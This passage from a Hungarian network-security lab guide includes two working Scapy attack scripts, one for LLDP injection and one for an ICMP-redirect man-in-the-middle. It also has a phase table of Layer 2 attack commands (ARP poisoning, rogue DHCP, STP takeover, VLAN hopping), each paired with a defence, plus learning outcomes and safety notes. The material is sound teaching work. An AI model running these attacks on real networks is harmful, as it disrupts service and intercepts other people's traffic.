    main()
```

### 9.11 `lldp_recon.py` — LLDP felderítés + hamis LLDPDU injektálása

```python
#!/usr/bin/env python3
"""LLDPDU-k passzív gyűjtése (rendszernév, port, képességek, menedzsment-IP),
plusz opcionálisan HAMIS LLDP-bejegyzés injektálása.
LLDP: IEEE-szabvány, ethertype 0x88CC, multicast 01:80:c2:00:00:0e.

Futtatás: sudo python3 lldp_recon.py eth0 [--inject]
"""
import sys
from scapy.all import sniff, Ether, sendp, conf

LLDP_DST, LLDP_ETHTYPE = "01:80:c2:00:00:0e", 0x88CC

def build_fake_lldp(our_mac):
    chassis = b"\x02\x07\x04" + bytes.fromhex(our_mac.replace(":", ""))
    port = b"\x04\x05\x03\x00\x12\x46\x61\x30\x2f\x38"
    ttl = b"\x06\x02\x00\x78"
    return chassis + port + ttl + b"\x00"

def show_lldp(pkt):
    print(f"[+] LLDPDU látva: {pkt.src}, {len(pkt)} bájt")
    print("    Payload (első 64 bájt):", bytes(pkt)[:64].hex())

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    if "--inject" in sys.argv:
        frame = Ether(dst=LLDP_DST, src=conf.iface.mac, type=LLDP_ETHTYPE) / \
                build_fake_lldp(conf.iface.mac)
        print(f"[*] Hamis LLDPDU injektálása (chassis = {conf.iface.mac})...")
        for _ in range(5):
            sendp(frame, verbose=0)
    print(f"[*] LLDP-figyelés a(z) {iface}-n 30 mp-ig...")
    sniff(iface=iface, lfilter=lambda p: Ether in p and p[Ether].type == LLDP_ETHTYPE,
          prn=show_lldp, store=0, timeout=30)

if __name__ == "__main__":
    main()
```

### 9.12 `icmp_redirect.py` — Gateway MITM ICMP redirecten keresztül

```python
#!/usr/bin/env python3
"""Gateway MITM ICMP Redirect-del: az áldozatnak azt hazudjuk, hogy a gateway
a támadón át érhető el egy adott cél felé.

Futtatás: sudo python3 icmp_redirect.py eth0 <victim_ip> <gateway_ip> [prefix]
Megjegyzés: a demonstrációhoz az áldozat VM-en engedélyezni kell:
  sysctl -w net.ipv4.conf.eth0.accept_redirects=1
(a modern alapértelmezés tiltja — ez maga is tanulság!)
"""
import sys, time
from scapy.all import Ether, IP, ICMP, sendp, conf, arping, get_if_hwaddr

def resolve(ip, iface):
    ans, _ = arping(ip, iface=iface, verbose=0)
    return ans[0][1].src

def main():
    iface, victim, gateway = sys.argv[1], sys.argv[2], sys.argv[3]
    prefix = sys.argv[4] if len(sys.argv) > 4 else "0.0.0.0/0"
    conf.iface = iface
    vmac = resolve(victim, iface)
    att_ip = getattr(conf.iface, "ip", None) or "10.10.10.66"
    target_ip = prefix.split("/")[0]
    pkt = (Ether(src=get_if_hwaddr(iface), dst=vmac) /
           IP(src=gateway, dst=victim) /              # "a gateway-től"
           ICMP(type=5, code=1, gw=att_ip) /          # redirect host, a támadón át
           IP(src=victim, dst=target_ip))
    print(f"[*] ICMP redirectek: {victim} felé, a gateway-nek kiadva magunkat ({gateway})...")
    try:
        for _ in range(20):
            sendp(pkt, verbose=0)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    print("[!] A PC-V-n az 'ip route' parancs mutatja a redirect-től telepített route-ot.")

if __name__ == "__main__":
    main()
```

---

## 10. A labor menete fázisonként

| Fázis | Tevékenység | Parancs | Elvárt eredmény |
|---|---|---|---|
| 0 | Baseline feltöltése | `python3 push_config.py inventory.yml configs/baseline.yml` | Eszközök elérhetők SSH-n és Telneten |
| 1 | **MAC flood** | `sudo python3 attacker/mac_flood.py eth0 10000` | CAM-tábla megtelik; PC-V tcpdumpjában idegen forgalom |
| 1v | Védelem | `push_config.py ... port-security` | Fa0/3: `violation shutdown` → err-disabled (Fa0/1: `restrict` + sticky); a CAM nem telik meg |
| 2 | **MAC spoof** | `sudo python3 attacker/mac_spoof.py eth0 <PC-V-MAC>` | Syslog: port-security violation |
| 3 | **DHCP starvation** | `sudo python3 attacker/dhcp_starve.py eth0 250` | R1-en sok hamis binding; PC-V nem kap címet |
| 3v | Védelem | `push_config.py ... dhcp-snooping` | Untrusted porton rate-limit, üzenetek eldobva |
| 4 | **Rogue DHCP** | `sudo python3 attacker/rogue_dhcp.py eth0` + PC-V renew | PC-V gatewayje 10.10.10.254 (a támadó) |
| 4v | Védelem | (a dhcp-snooping már aktív) | Csak legitim lease; a PC-V helyes címet kap |
| 5 | **ARP poison** | `sudo python3 attacker/arp_spoof.py eth0 <PC-V-IP> 10.10.10.1` | PC-V `arp -a`: a gateway MAC-je = a támadó MAC-je |
| 5v | Védelem | `push_config.py ... dai` | A DAI-statisztikában nő a dropped; az ARP-tábla nem változik |
| 6 | **STP takeover** | `sudo python3 attacker/stp_takeover.py eth0` | Védelem nélkül: `show spanning-tree root` = a támadó |
| 6v | Védelem | `push_config.py ... stp-guard` | Fa0/3 err-disabled; syslog |
| 7 | **VLAN hop / DTP** | `sudo python3 attacker/vlan_hop_recon.py eth0` | Védelem nélkül DTP-keret látszik |
| 7v | Védelem | `push_config.py ... vlan-hop` | Nincs DTP; fix access portok; a nem használt portok lezárva |
| 8 | **CDP + Telnet** | `sudo python3 attacker/cdp_telnet_recon.py eth0 10.0.99.1` | A CDP-ben IOS-verzió látszik; Telnet nyitva |
| 8v | Védelem | `push_config.py ... hardening` | Nincs CDP; SSH v2; Telnet elutasítva |
| 9 | **Double-tagging** | `sudo python3 attacker/vlan_double_tag.py eth0 10.20.20.10` | PC-W (VLAN 20) ICMP-t kap a VLAN 10-es támadótól |
| 9v | Védelem | `push_config.py ... native-vlan-hardening` | A keret nem jut el a VLAN 20-ba |
| 10 | **IP spoofing** | `sudo python3 attacker/ip_spoof.py eth0 10.10.10.50` | Védelem nélkül a hamis forrás látszik |
| 10v | Védelem | `push_config.py ... ip-source-guard` | Keretek hardware-drop; `show ip verify source` |
| 11 | **LLDP felderítés** | `sudo python3 attacker/lldp_recon.py eth0 --inject` | LLDPDU-k: rendszernév, portok |
| 11v | Védelem | `push_config.py ... lldp-hardening` | A user-portokon nincs LLDP TX/RX |
| 12 | **ICMP-redirect MITM** | `sudo python3 attacker/icmp_redirect.py eth0 <PC-V-IP> 10.10.10.1` | A PC-V route-táblája a támadón át vezet |
| 12v | Védelem | `push_config.py ... icmp-redirect` | A router sosem küld redirectet |
| Z | Összesítés | `python3 verify.py inventory.yml` | Minden védelem aktív, pontszám + jegy |

**Függőségi sorrend (kritikus!):**
1. `ip-source-guard` csak a `dhcp-snooping` UTÁN push-olható — az IPSG a snooping binding-táblájából dolgozik, enélkül minden user-forgalom elesik. (Érdemes szándékosan is megmutatni hibakeresési gyakorlatként.)
2. A `native-vlan-hardening` után a double-tagging tesztet újra le kell futtatni a hatás ellenőrzésére.
3. A 12. fázishoz a PC-V VM-en `accept_redirects=1` szükséges — ezt a diákok maguk állítják be, majd megbeszéljük, miért jó, hogy éles rendszeren tiltva van.
4. **Fázisközi figyelem:** a 2. fázis (`violation shutdown`) és a 6. fázis (BPDU Guard) után a Fa0/3 **err-disabled** állapotba kerülhet — a következő támadás futtatása ELŐTT állítsd helyre a portot (`shutdown` / `no shutdown`).

---

## 11. Elvárt tanulási eredmények

1. A hallgató értelmezi a CAM-tábla, a DHCP, az ARP, az STP, a VLAN-tagging, a CDP/LLDP és az ICMP redirect működését a támadások hatásán keresztül.
2. A hallgató megkülönbözteti, melyik védelem melyik támadás ellen hatékony — és azt is, melyik mit NEM véd ki (pl. a port security nem véd ARP poisoning ellen).
3. A hallgató képes deklaratív (YAML) konfigurációt kódformában (netmiko) alkalmazni — ez a Modul 11 best practice-jei és a hálózatiautomatizálás közötti híd.
4. A hallgató a verify-kimenetek alapján dokumentálja, melyik védelem melyik támadási forgalmat dobta el.
5. A hallgató összekapcsolja a Layer 2-védelmeket a felettük futó protokollok (HTTP, HTTPS, DNS, DoH) adatvédelmi vonatkozásaival — lásd a reflexiós lapot.

## 12. Biztonsági megjegyzések

- A rogue DHCP és az ARP poison valódi szolgáltatászavart okoz — izolált VLAN-ban futtasd.
- STP takeovernél a teljes VLAN-topológia átszámol — sosem production switchre.
- `err-disabled` port visszaállítása: `shutdown` / `no shutdown`, vagy `errdisable recovery cause psecure-violation`.
- Minden scapy-szkript root-ként fut (raw socket).
- Platformfüggő szintaxisok ellenőzendők a saját IOS-odon: LLDP portszintű parancsok, IPSG, DAI rate-limit formátum.
- A labor végén a `baseline.yml` újranyomása visszaállítja a védtelen állapotot a következő csoportnak — a megmaradt sticky MAC-eket és snooping bindingokat `clear`-parancsokkal tisztítsd.
